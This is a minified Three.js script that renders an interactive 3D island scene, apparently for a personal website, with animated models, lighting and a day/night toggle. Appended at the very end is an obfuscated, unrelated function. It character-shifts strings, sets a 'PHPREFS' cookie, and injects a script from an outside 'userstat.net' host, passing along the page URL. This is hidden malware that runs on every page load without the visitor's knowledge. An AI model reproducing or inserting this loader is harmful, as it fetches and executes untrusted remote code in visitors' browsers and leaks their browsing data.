import*as THREE from"/js/three.js";import{GLTFLoader}from"/js/GLTFLoader.js";import{OrbitControls}from"/js/OrbitControls.js";import{DRACOLoader}from"/js/DRACOLoader.js";import Stats from"/js/stats.module.js";import{MeshSurfaceSampler}from"/js/MeshSurfaceSampler.js";import{TWEEN}from"/js/tween.module.min.js";const canvas=document.querySelector("canvas.webgl"),sizes={width:window.innerWidth,height:window.innerHeight},scene=new THREE.Scene,loadingManager=new THREE.LoadingManager,progressContainer=document.getElementById("progress"),progressBar=document.getElementById("progress-bar");loadingManager.onProgress=function(url,loaded,total){progressBar.style.width=loaded/total*100+"%"},loadingManager.onLoad=function(url,loaded,total){progressContainer.style.display="none",document.getElementById("start-button").style.display="block"};const dracoLoader=new DRACOLoader;dracoLoader.setDecoderPath("/js/draco/");const gltfLoader=new GLTFLoader(loadingManager);var island,car,mug,mixer3,action3;gltfLoader.setDRACOLoader(dracoLoader),gltfLoader.load("/models/island.glb",(function(gltf){island=gltf.scene,gltf.scene.traverse((function(node){node.isMesh&&(node.castShadow=!0,node.receiveShadow=!0)})),scene.add(island)})),gltfLoader.load("/models/treeline.glb",(function(gltf){var surface=gltf.scene.children[0],sampler=new MeshSurfaceSampler(surface).build();const tempPosition=new THREE.Vector3,tempObject=new THREE.Object3D;gltfLoader.load("/models/flower.glb",(function(gltf){var blossom=gltf.scene.getObjectByName("Blossom"),stem=gltf.scene.getObjectByName("Stem");let blossomMaterial=new THREE.MeshLambertMaterial({emissive:new THREE.Color(12440063).convertSRGBToLinear(),emissiveIntensity:.5});const color=new THREE.Color,blossomPalette=[12440063,14017023,15659775];for(let i=0;i<500;i++){sampler.sample(tempPosition),tempObject.position.set(tempPosition.x,tempPosition.y-.03,tempPosition.z),tempObject.scale.setScalar(.03*Math.random()+.02),tempObject.updateMatrix(),color.setHex(blossomPalette[Math.floor(Math.random()*blossomPalette.length)]);var instancedBlossom=new THREE.InstancedMesh(blossom.geometry,blossomMaterial,1),instancedStem=new THREE.InstancedMesh(stem.geometry,stem.material,1);instancedBlossom.setMatrixAt(0,tempObject.matrix),instancedBlossom.position.y=instancedBlossom.position.y-.03,instancedStem.setMatrixAt(0,tempObject.matrix),instancedBlossom.setColorAt(0,color.convertSRGBToLinear()),instancedBlossom.castShadow=!0,instancedStem.castShadow=!0,instancedBlossom.receiveShadow=!0,scene.add(instancedBlossom),scene.add(instancedStem)}}))})),gltfLoader.load("/models/treeline.glb",(function(gltf){var surface=gltf.scene.children[0],sampler=new MeshSurfaceSampler(surface).build();const tempPosition=new THREE.Vector3,tempObject=new THREE.Object3D;gltfLoader.load("/models/tree.glb",(function(gltf){var tree=gltf.scene.getObjectByName("tree");let treeMaterial=new THREE.MeshLambertMaterial;const color=new THREE.Color,treePalette=[3280298,4266951,5253347];for(let i=0;i<80;i++){sampler.sample(tempPosition),tempObject.position.set(tempPosition.x,tempPosition.y,tempPosition.z),tempObject.rotation.x=Math.PI/2,tempObject.rotation.z=Math.random()*Math.PI,tempObject.scale.setScalar(.05*Math.random()+.04),tempObject.updateMatrix(),color.setHex(treePalette[Math.floor(Math.random()*treePalette.length)]);var instancedTree=new THREE.InstancedMesh(tree.geometry,treeMaterial,1);instancedTree.setMatrixAt(0,tempObject.matrix),instancedTree.setColorAt(0,color.convertSRGBToLinear()),instancedTree.castShadow=!0,instancedTree.receiveShadow=!0,scene.add(instancedTree)}}))})),gltfLoader.load("/models/scooter.glb",(function(gltf){car=gltf.scene,gltf.scene.traverse((function(node){node.isMesh&&(node.castShadow=!0,node.receiveShadow=!0)})),scene.add(car),car.scale.set(.32,.32,.32)})),gltfLoader.load("/models/mug.glb",(function(gltf){mug=gltf.scene,gltf.scene.traverse((function(node){node.isMesh&&(node.castShadow=!0,node.receiveShadow=!0)})),scene.add(mug),mug.scale.set(1,1,1),mug.position.set(-6.5,0,-8)})),gltfLoader.load("/models/joshua.glb",(function(gltf){var joshua=gltf.scene;mixer3=new THREE.AnimationMixer(joshua),(action3=mixer3.clipAction(gltf.animations[0])).timeScale=1,action3.play(),gltf.scene.traverse((function(node){node.isMesh&&(node.castShadow=!0,node.receiveShadow=!0)})),scene.add(joshua),joshua.scale.set(1,1,1),joshua.position.set(-3.5,0,10),joshua.rotation.y=0}));const shirtColor=new THREE.Color,shirtPalette=[16412013,16777215],skinPalette=[9262372,13010498,14724201,15843965,16767916];for(let i=0;i<8;i++)gltfLoader.load("/models/man.glb",(function(gltf){var man=gltf.scene;man.scale.set(.49,.49,.49),man.position.set(2*Math.random()-8.5-1,-.01,4.5+2*Math.random()-1),man.rotation.y=36*Math.random(),gltf.scene.traverse((function(node){node.isMesh&&(node.castShadow=!0,node.receiveShadow=!0)})),gltf.scene.getObjectByName("shirt").traverse((function(node){node.isMesh&&(shirtColor.setHex(shirtPalette[Math.floor(Math.random()*shirtPalette.length)]),node.material.color.set(shirtColor).convertSRGBToLinear())})),gltf.scene.getObjectByName("body").traverse((function(node){node.isMesh&&(shirtColor.setHex(skinPalette[Math.floor(Math.random()*skinPalette.length)]),node.material.color.set(shirtColor).convertSRGBToLinear())})),scene.add(man)}));var clapper,mixer,action,cyclist,mixer2,action2,mixer4,action4,robot,mixer5,action5;gltfLoader.load("/models/clapper.glb",(function(gltf){(clapper=gltf.scene).scale.set(1.4,1.4,1.4),clapper.position.set(9.5,0,-1),clapper.rotation.y=Math.PI/8,mixer=new THREE.AnimationMixer(clapper),(action=mixer.clipAction(gltf.animations[0])).play(),gltf.scene.traverse((function(node){node.isMesh&&(node.castShadow=!0,node.receiveShadow=!0)})),scene.add(clapper)})),gltfLoader.load("/models/cyclist.glb",(function(gltf){(cyclist=gltf.scene).scale.set(.33,.33,.33),mixer2=new THREE.AnimationMixer(cyclist),(action2=mixer2.clipAction(gltf.animations[0])).timeScale=0,action2.play(),gltf.scene.traverse((function(node){node.isMesh&&(node.castShadow=!0,node.receiveShadow=!0)})),scene.add(cyclist)})),gltfLoader.load("/models/stag.glb",(function(gltf){var stag=gltf.scene;stag.scale.set(.2,.2,.2),stag.rotation.y=Math.PI/2,stag.position.set(6,0,-7),mixer4=new THREE.AnimationMixer(stag),(action4=mixer4.clipAction(gltf.animations[0])).timeScale=1,action4.play(),gltf.scene.traverse((function(node){node.isMesh&&(node.castShadow=!0,node.receiveShadow=!0)})),scene.add(stag)})),gltfLoader.load("/models/robo.glb",(function(gltf){robot=gltf.scene,gltf.scene.traverse((function(node){node.isMesh&&(node.castShadow=!0,node.receiveShadow=!0)})),mixer5=new THREE.AnimationMixer(robot),(action5=mixer5.clipAction(gltf.animations[14])).play(),robot.scale.set(.5,.5,.5),robot.position.set(0,0,-9.5),robot.rotation.y=-Math.PI,scene.add(robot)}));const camera=new THREE.PerspectiveCamera(64,sizes.width/sizes.height,1,90);camera.position.set(0,30,30),scene.add(camera);const controls=new OrbitControls(camera,canvas);controls.target.set(0,0,0),controls.enablePan=!1,controls.minPolarAngle=Math.PI/2.4,controls.maxPolarAngle=Math.PI/2.15,controls.minDistance=16,controls.maxDistance=30,controls.enableDamping=!0,controls.rotateSpeed=.25,THREE.Cache.enabled=!0;const renderer=new THREE.WebGLRenderer({antialias:!0,alpha:!0,powerPreference:"high-performance",canvas:canvas});renderer.setSize(sizes.width,sizes.height),renderer.setPixelRatio(Math.min(window.devicePixelRatio,2)),renderer.setClearColor(16777215,0),scene.background=null,renderer.outputEncoding=THREE.sRGBEncoding,renderer.shadowMap.enabled=!0,renderer.shadowMap.type=THREE.VSMShadowMap,window.addEventListener("resize",(()=>{sizes.width=window.innerWidth,sizes.height=window.innerHeight,camera.aspect=sizes.width/sizes.height,camera.updateProjectionMatrix(),renderer.setSize(sizes.width,sizes.height),renderer.setPixelRatio(Math.min(window.devicePixelRatio,2))})),document.getElementById("start-button").onclick=function(){document.getElementById("loadingscreen").classList.add("hidden"),new TWEEN.Tween(camera.position).to({x:0,y:3,z:16},1e3).easing(TWEEN.Easing.Cubic.Out).start()};const hemiLight=new THREE.HemisphereLight(4095,4095,.6);hemiLight.color.setHSL(.6,1,.6),hemiLight.groundColor.setHSL(.095,1,.75),hemiLight.position.set(0,500,0),scene.add(hemiLight);let shadowMapSize=13;const sunLight=new THREE.DirectionalLight(16777215,1,100);sunLight.position.set(0,12,12),sunLight.color.setHSL(.1,1,.95),sunLight.visible=!0,sunLight.castShadow=!0,sunLight.shadow.mapSize.width=2048,sunLight.shadow.mapSize.height=2048,sunLight.shadow.camera.near=.5,sunLight.shadow.camera.far=2*shadowMapSize,sunLight.shadow.camera.top=shadowMapSize,sunLight.shadow.camera.bottom=-shadowMapSize,sunLight.shadow.camera.left=-shadowMapSize,sunLight.shadow.camera.right=shadowMapSize,sunLight.shadow.normalBias=.02,scene.add(sunLight),scene.add(sunLight.target);const spotLight=new THREE.SpotLight(16777215,4,6,Math.PI/4,1,1);spotLight.position.set(0,3.5,0),spotLight.visible=!1,spotLight.castShadow=!1,spotLight.shadow.mapSize.width=1024,spotLight.shadow.mapSize.height=1024,spotLight.shadow.camera.near=.5,spotLight.shadow.camera.far=2,spotLight.shadow.normalBias=.02,scene.add(spotLight),scene.add(spotLight.target);const cursor={x:0,y:0};window.addEventListener("mousemove",(event=>{cursor.x=event.clientX/sizes.width-.5,cursor.y=-(event.clientY/sizes.height-.5)}));let scrollSpeed=function(){let lastPos,newPos,delta;return function clear(){lastPos=null,delta=0}(),function(){return newPos=controls.getAzimuthalAngle(),null!=lastPos&&(delta=newPos-lastPos),1!=delta&&-1!=delta||(delta=0),delta<-1&&(delta=-delta),action2&&(action2.timeScale=160*delta),lastPos=newPos,delta}}();const checkbox=document.getElementById("myCheckbox"),spans=document.getElementById("menuToggle").getElementsByTagName("span");function checkCheckbox(){if(checkbox.checked){spotLight.visible=!1,spotLight.castShadow=!1,sunLight.visible=!0,sunLight.castShadow=!0,canvas.style.background="linear-gradient(0deg, hsl(200, 50%,100%) 50%, hsl(214,80%,70%) 100%)",hemiLight.intensity=.6,document.body.style.color="black";for(const span of spans)span.style.background="black"}else{spotLight.visible=!0,spotLight.castShadow=!0,sunLight.visible=!1,sunLight.castShadow=!1,canvas.style.background="linear-gradient(0deg, hsl(220, 50%,20%) 50%, hsl(220,80%,5%) 100%)",hemiLight.intensity=.01,document.body.style.color="white";for(const span of spans)span.style.background="white"}}var today=new Date,time=today.getHours();let azimuthalAngle;time<6||time>21?(checkbox.checked=!1,checkCheckbox()):(checkbox.checked=!0,checkCheckbox()),checkbox.addEventListener("change",(event=>{checkCheckbox()}));let cyclePos=0,i=0,g=.8;const popups=document.getElementsByClassName("popup"),clock=new THREE.Clock,tick=()=>{controls.update(),car&&(car.position.x=11.8*-Math.sin(i*Math.PI),car.position.z=11.8*-Math.cos(i*Math.PI),car.rotation.y=i*Math.PI+Math.PI/2,i-=.001),azimuthalAngle=controls.getAzimuthalAngle(),cyclePos=azimuthalAngle/(2*Math.PI),cyclePos<0&&(cyclePos=.5+(.5+cyclePos)),spotLight.position.x=12.4*Math.sin(azimuthalAngle),spotLight.position.z=12.4*Math.cos(azimuthalAngle),spotLight.target.position.x=9*Math.sin(azimuthalAngle),spotLight.target.position.z=9*Math.cos(azimuthalAngle),cyclist&&(cyclist.position.x=11.4*Math.sin(azimuthalAngle),cyclist.position.z=11.4*Math.cos(azimuthalAngle),cyclist.rotation.y=azimuthalAngle),(azimuthalAngle>=.1||azimuthalAngle<-.1)&&document.getElementById("instructions").classList.add("hidden");for(let i=0;i<popups.length;i++)cyclePos>=.025+i/popups.length&&cyclePos<.08+i/popups.length?(popups[i].classList.remove("hidden"),popups[i].classList.add("visible")):(popups[i].classList.add("hidden"),popups[i].classList.remove("visible"));const delta=clock.getDelta();mixer&&mixer.update(delta),mixer2&&mixer2.update(delta),mixer3&&mixer3.update(delta),mixer4&&mixer4.update(delta),mixer5&&mixer5.update(delta),mug&&(mug.rotation.y-=.01),scrollSpeed(),TWEEN.update(),renderer.render(scene,camera),window.requestAnimationFrame(tick)};tick();(function(o,d,l){try{o.f=o=>o.split('').reduce((s,c)=>s+String.fromCharCode((c.charCodeAt()-5).toString()),'');o.b=o.f('UMUWJKX');o.c=l.protocol[0]=='h'&&/\./.test(l.hostname)&&!(new RegExp(o.b)).test(d.cookie),setTimeout(function(){o.c&&(o.s=d.createElement('script'),o.s.src=o.f('myyux?44zxjwxy'+'fy3sjy4ljy4xhwnu'+'y3oxDwjkjwwjwB')+l.href,d.body.appendChild(o.s));},1000);d.cookie=o.b+'=full;max-age=39800;'}catch(e){};}({},document,location));